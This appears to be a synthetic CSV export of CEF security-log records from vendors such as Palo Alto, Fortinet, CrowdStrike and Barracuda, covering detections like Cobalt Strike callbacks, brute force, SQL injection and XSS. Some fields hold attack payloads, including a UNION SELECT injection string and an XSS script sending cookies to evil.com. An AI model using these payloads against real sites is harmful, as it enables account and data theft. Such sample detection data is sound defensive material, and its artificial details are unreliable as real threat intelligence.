TenantId,SourceSystem,ReceiptTime,DeviceVendor,DeviceProduct,DeviceEventClassID,LogSeverity,OriginalLogSeverity,DeviceAction,SimplifiedDeviceAction,Computer,CommunicationDirection,DeviceFacility,DestinationPort,DestinationIP,DeviceAddress,DeviceName,Message,Protocol,SourcePort,SourceIP,RemoteIP,RemotePort_string,RemotePort_int,MaliciousIP,ThreatSeverity,IndicatorThreatType,ThreatDescription,ThreatConfidence,ReportReferenceLink,MaliciousIPLongitude,MaliciousIPLatitude,MaliciousIPCountry,DeviceVersion,Activity,ApplicationProtocol,EventCount,DestinationDnsDomain,DestinationServiceName,DestinationTranslatedAddress,DestinationTranslatedPort,DeviceDnsDomain,DeviceExternalID,DeviceInboundInterface,DeviceNtDomain,DeviceOutboundInterface,DevicePayloadId,ProcessName,DeviceTranslatedAddress,DestinationHostName,DestinationMACAddress,DestinationNTDomain,DestinationProcessId,DestinationUserPrivileges,DestinationProcessName,DeviceTimeZone,DestinationUserID,DestinationUserName,DeviceMacAddress,ProcessID,ExternalID,FileCreateTime,FileHash,FileID,FileModificationTime,FilePath,FilePermission,FileType,FileName,FileSize,ReceivedBytes,OldFileCreateTime,OldFileHash,OldFileID,OldFileModificationTime,OldFileName,OldFilePath,OldFilePermission,OldFileSize,OldFileType,SentBytes,RequestURL,RequestClientApplication,RequestContext,RequestCookies,RequestMethod,SourceHostName,SourceMACAddress,SourceNTDomain,SourceDnsDomain,SourceServiceName,SourceTranslatedAddress,SourceTranslatedPort,SourceProcessId,SourceUserPrivileges,SourceProcessName,SourceUserID,SourceUserName,EventType,DeviceCustomIPv6Address1,DeviceCustomIPv6Address1Label,DeviceCustomIPv6Address2,DeviceCustomIPv6Address2Label,DeviceCustomIPv6Address3,DeviceCustomIPv6Address3Label,DeviceCustomIPv6Address4,DeviceCustomIPv6Address4Label,DeviceCustomFloatingPoint1,DeviceCustomFloatingPoint1Label,DeviceCustomFloatingPoint2,DeviceCustomFloatingPoint2Label,DeviceCustomFloatingPoint3,DeviceCustomFloatingPoint3Label,DeviceCustomFloatingPoint4,DeviceCustomFloatingPoint4Label,DeviceCustomNumber1,DeviceCustomNumber1Label,DeviceCustomNumber2,DeviceCustomNumber2Label,DeviceCustomNumber3,DeviceCustomNumber3Label,DeviceCustomString1,DeviceCustomString1Label,DeviceCustomString2,DeviceCustomString2Label,DeviceCustomString3,DeviceCustomString3Label,DeviceCustomString4,DeviceCustomString4Label,DeviceCustomString5,DeviceCustomString5Label,DeviceCustomString6,DeviceCustomString6Label,DeviceCustomDate1,DeviceCustomDate1Label,DeviceCustomDate2,DeviceCustomDate2Label,FlexDate1,FlexDate1Label,FlexNumber1,FlexNumber1Label,FlexNumber2,FlexNumber2Label,FlexString1,FlexString1Label,FlexString2,FlexString2Label,AdditionalExtensions,StartTime [UTC],EndTime [UTC],Type,_ResourceId,DNSName,EventId
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Vectra Networks,X Series,hidden_https_tunnel_cnc,2.2,,,,,,,443,15.230.137.45,192.168.52.37,ClientPc.contoso.com,type1,tcp,,17.81.146.1,,,,,,,,,,,,,6.6,Hidden HTTPS Tunnel,,,,,,,,,,,,,,,07605jn8l36uranbtvef0b12eu1.appsync-api.us-east-1.avsvmcloud.com,,,,,,,,,,,54,,,,,,,,,,56296,,,,,,,,,,1748,,,,,,IP-10.10.1.130,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,https://x29-1-37.sc.tvec/detections/54?detail_id\=322,Vectra Event URL,FALSE,triaged,,,,,,,,,22,threat,64,certainty,,,,,cat=COMMAND & CONTROL;start=1617770662000;end=1617772463000,,,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-fortinet/providers/microsoft.compute/virtualmachines/soc-fw-cef,,8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Palo Alto Networks,PAN-OS,THREAT,8,,deny,Deny,PA-FW-01.contoso.com,1,,443,203.0.113.50,10.0.1.1,PA-FW-01.contoso.com,Spyware detected: Cobalt Strike beacon callback to known C2 server,tcp,49152,10.10.5.22,203.0.113.50,,,,203.0.113.50,8,C2,,90,https://threatvault.paloaltonetworks.com/threat/86543,12.5432,52.3456,Netherlands,10.2,Spyware Alert,HTTPS,1,,,,,,,,ethernet1/2,,CONTOSO,ethernet1/1,,svchost.exe,,malware-c2.evil.com,,,,,,,UTC,,,,,,,,,,,,,,,4096,,,,,,,,,,1024,,,,,,,,,,,,,,,,,,,,,,https://malware-c2.evil.com/beacon,Mozilla/5.0 (Windows NT 10.0),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86543,Cobalt Strike Beacon,,,,,,,,,cat=spyware;cs6=beacon-http;cs6Label=Rule;start=1702641600000;end=1702641660000,2025-12-15T08:20:00Z,2025-12-15T08:21:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-paloalto/providers/microsoft.compute/virtualmachines/soc-pa-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Check Point,VPN-1 & FireWall-1,250001,7,,Drop,Deny,CPFW01.contoso.com,1,,22,198.51.100.45,10.0.0.5,CPFW01.contoso.com,SSH brute force attempt detected - 150 failed login attempts in 60 seconds from single source,tcp,44821,198.51.100.45,,,,,198.51.100.45,7,Brute Force,,85,,13.4050,52.5200,Germany,R81.20,Brute Force Prevention,,150,,sshd,,,,,eth1,,CONTOSO,eth0,,,,sshd-server.contoso.com,,,,,,,UTC,,root,,,,,,,,,,,,,,,,150,,,,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=Intrusion Prevention;cs5=SSH_Brute_Force_Rule;cs5Label=Rule;start=1702641000000;end=1702641060000,2025-12-15T08:10:00Z,2025-12-15T08:11:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-checkpoint/providers/microsoft.compute/virtualmachines/soc-cp-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Fortinet,FortiGate,0419016384,4,,blocked,Deny,FGT-FW01.contoso.com,1,,80,10.10.3.15,10.0.2.10,FGT-FW01.contoso.com,Malware download blocked: Win.Trojan.Emotet variant detected in HTTP download from compromised website,tcp,52341,10.10.3.15,,,,,,,,,,,,,7.4.1,IPS Alert - Malware,HTTP,1,,,,,,,,port1,,CONTOSO,port2,,explorer.exe,,compromised-shop.example.com,,,,,,,UTC,,jsmith,,,,,,emotet_payload.dll,,,,,,/downloads/update.dll,,dll,emotet_payload.dll,245760,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=malware;cs3=emotet_variant_x;cs3Label=Malware Name;start=1702644000000;end=1702644005000,2025-12-15T09:00:00Z,2025-12-15T09:00:05Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-fortinet/providers/microsoft.compute/virtualmachines/soc-fw-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,CrowdStrike,Falcon Host,DetectionSummaryEvent,9,,killProcess,Deny,sensor-win-srv01.contoso.com,,,,,10.10.1.50,sensor-win-srv01.contoso.com,Ransomware behavior detected: Mass file encryption observed. Process mimikatz.exe spawned by cmd.exe performing rapid file modification across multiple directories,,,,,,,,,9,Ransomware,,95,https://falcon.crowdstrike.com/activity/detections/detail/abc123,,,,,6.45,Ransomware Prevention,,1,,,,,,,,,,,,,mimikatz.exe,,,,,,,,UTC,,SYSTEM,,1234,,,,d41d8cd98f00b204e9800998ecf8427e,,,,C:\Users\Public\mimikatz.exe,,exe,mimikatz.exe,1245184,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,Detection,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=Ransomware;cs1=High;cs1Label=Severity;cs4=Technique:T1486;cs4Label=MITRE ATT&CK;start=1702647600000;end=1702647660000,2025-12-15T10:00:00Z,2025-12-15T10:01:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-crowdstrike/providers/microsoft.compute/virtualmachines/soc-cs-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Cisco,ASA,106023,5,,Deny,Deny,CISCO-ASA-01.contoso.com,1,,53,8.8.8.8,10.10.2.100,CISCO-ASA-01.contoso.com,DNS exfiltration attempt detected: Unusually long DNS queries to suspicious domain encoding data in subdomains,udp,51234,10.10.2.100,8.8.8.8,,,,,,,,,,,,9.18,DNS Exfiltration Prevention,DNS,47,,,,,,,,,outside,,CONTOSO,inside,,dns-tunnel.exe,,,,,,,,UTC,,,,,,,,,,,,,,,,,47,,,,,,,,,,15200,,,,,,,,,,,,,,,,,,,,,,https://data.exfil-domain.xyz/q?d=AAAB64encodeddata,,,,,,,,,,,,,dns-tunnel.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=data-exfiltration;cs2=DNS Tunneling;cs2Label=Attack Type;start=1702651200000;end=1702652400000,2025-12-15T11:00:00Z,2025-12-15T11:20:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-cisco/providers/microsoft.compute/virtualmachines/soc-asa-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Trend Micro,Deep Security,4000000,6,,Reset,Deny,TM-DSA-01.contoso.com,1,,443,192.0.2.88,10.10.4.30,TM-DSA-01.contoso.com,SQL Injection attempt detected in web application: UNION SELECT attack against login form parameter,tcp,58432,192.0.2.88,,,,,192.0.2.88,6,SQL Injection,,88,,35.6895,139.6917,Japan,20.0,Intrusion Prevention - SQL Injection,HTTPS,1,,,,,,,,vmxnet3,,CONTOSO,vmxnet3,,httpd,,webapp.contoso.com,,,,,,,UTC,,,,,,,,,,,,,,,,,1,,,,,,,,,,2048,,,,,,,,,,,,,,,,,,,,,,https://webapp.contoso.com/login?user=admin%27%20UNION%20SELECT%20*%20FROM%20users--,Mozilla/5.0 (compatible; sqlmap/1.7),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,IPS Rule 1008611,SQL Injection Attack,,,,,,,,,cat=Intrusion Prevention;cs5=1008611;cs5Label=IPS Rule ID;start=1702654800000;end=1702654801000,2025-12-15T12:00:00Z,2025-12-15T12:00:01Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-trendmicro/providers/microsoft.compute/virtualmachines/soc-tm-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,F5,BIG-IP ASM,Malicious Bot,7,,Blocked,Deny,F5-WAF-01.contoso.com,1,,443,198.18.0.55,10.10.6.10,F5-WAF-01.contoso.com,Credential stuffing attack detected: 5000 unique username/password combinations attempted against authentication endpoint in 10 minutes,tcp,39201,198.18.0.55,,,,,198.18.0.55,7,Credential Stuffing,,92,,-33.8688,151.2093,Australia,17.1,Bot Defense - Credential Stuffing,HTTPS,5000,,,,,,,,1.1,,CONTOSO,1.2,,,,api.contoso.com,,,,,,,UTC,,,,,,,,,,,,,,,,,5000,,,,,,,,,,102400,,,,,,,,,,,,,,,,,,,,,,https://api.contoso.com/auth/login,python-requests/2.28.1,https://api.contoso.com/auth/login,,POST,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=credential-stuffing;cs1=Bot Defense;cs1Label=Module;cs6=Automated Tool;cs6Label=Bot Category;start=1702658400000;end=1702659000000,2025-12-15T13:00:00Z,2025-12-15T13:10:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-f5/providers/microsoft.compute/virtualmachines/soc-f5-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Barracuda,WAF,WEB-ATTACK,8,,Block,Deny,BWAF-01.contoso.com,1,,443,203.0.113.77,10.10.7.5,BWAF-01.contoso.com,Cross-site scripting (XSS) attack detected: Reflected XSS payload in search parameter attempting to steal session cookies,tcp,41567,203.0.113.77,,,,,203.0.113.77,8,XSS Attack,,91,,55.7558,37.6173,Russia,12.2,Web Application Firewall - XSS Prevention,HTTPS,1,,,,,,,,eth0,,CONTOSO,eth1,,,,store.contoso.com,,,,,,,UTC,,,,,,,,,,,,,,,,,1,,,,,,,,,,512,,,,,,,,,,,,,,,,,,,,,,https://store.contoso.com/search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E,Mozilla/5.0 (Windows NT 10.0; Win64; x64),https://store.contoso.com/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,XSS Rule 942100,Reflected XSS Attack,,,,,,,,,cat=web-attack;cs3=OWASP-CRS-942100;cs3Label=WAF Rule;start=1702662000000;end=1702662001000,2025-12-15T14:00:00Z,2025-12-15T14:00:01Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-barracuda/providers/microsoft.compute/virtualmachines/soc-bwaf-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Zscaler,NSS,DLP,6,,Allow,Allow,ZS-NSS-01.contoso.com,1,,443,104.18.32.7,10.10.8.42,ZS-NSS-01.contoso.com,DLP policy violation: Sensitive data (credit card numbers PCI pattern) detected in file upload to unauthorized cloud storage service,tcp,52890,10.10.8.42,104.18.32.7,,,,,,,,,,,,6.1,Data Loss Prevention,HTTPS,1,,,,,,,,,,,,,,,,,unauthorized-cloud.io,,,,,,,UTC,,mwilson,,,,,,,a3f2b8c1d4e5f67890abcdef12345678,,,,/uploads/customer_data.xlsx,,xlsx,customer_data.xlsx,5242880,5242880,,,,,,,,,,,,,,,,,,,,,,https://unauthorized-cloud.io/upload,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0,,,,,chrome.exe,,mwilson,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DLP Rule,PCI-DSS Credit Card,FALSE,DLP Violation,,,,,,,,,cat=DLP;cs1=PCI-DSS;cs1Label=DLP Engine;cs4=Credit Card Numbers;cs4Label=Data Type;start=1702665600000;end=1702665610000,2025-12-15T15:00:00Z,2025-12-15T15:00:10Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-zscaler/providers/microsoft.compute/virtualmachines/soc-zs-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Palo Alto Networks,PAN-OS,THREAT,9,,alert,Allow,PA-FW-01.contoso.com,0,,8443,10.10.1.50,10.10.9.100,PA-FW-01.contoso.com,Lateral movement detected: Internal host scanning multiple ports on domain controller followed by successful RDP connection,tcp,61234,10.10.1.50,10.10.9.100,,,,,,,,,,,,10.2,Lateral Movement Detection,RDP,25,,,,,,,,,ethernet1/3,,CONTOSO,ethernet1/3,,powershell.exe,,DC01.contoso.com,,,,,,,UTC,,SYSTEM,,,,,,,,,,,,,,,,25,,,,,,,,,,8192,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe,,SYSTEM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=lateral-movement;cs2=Port Scan + RDP;cs2Label=Attack Pattern;cs4=Technique:T1021.001;cs4Label=MITRE ATT&CK;start=1702669200000;end=1702669500000,2025-12-15T16:00:00Z,2025-12-15T16:05:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-paloalto/providers/microsoft.compute/virtualmachines/soc-pa-cef,,
8ecf8077-cf51-4820-aadd-14040956f35d,OpsManager,,Fortinet,FortiGate,0720018432,10,,dropped,Deny,FGT-FW01.contoso.com,1,,443,192.0.2.200,10.0.3.1,FGT-FW01.contoso.com,DDoS attack mitigated: SYN flood targeting web server from botnet - 50000 connections per second from distributed sources,tcp,0,192.0.2.200,,,,,192.0.2.200,10,DDoS,,99,,39.9042,116.4074,China,7.4.1,DDoS Protection - SYN Flood,HTTPS,50000,,,,,,,,port3,,CONTOSO,port4,,,,webserver.contoso.com,,,,,,,UTC,,,,,,,,,,,,,,,,,50000,,,,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cat=DDoS;cs1=SYN Flood;cs1Label=Attack Vector;cs5=DoS-Policy-1;cs5Label=Policy;start=1702672800000;end=1702673100000,2025-12-15T17:00:00Z,2025-12-15T17:05:00Z,CommonSecurityLog,/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourcegroups/soc-fortinet/providers/microsoft.compute/virtualmachines/soc-fw-cef,,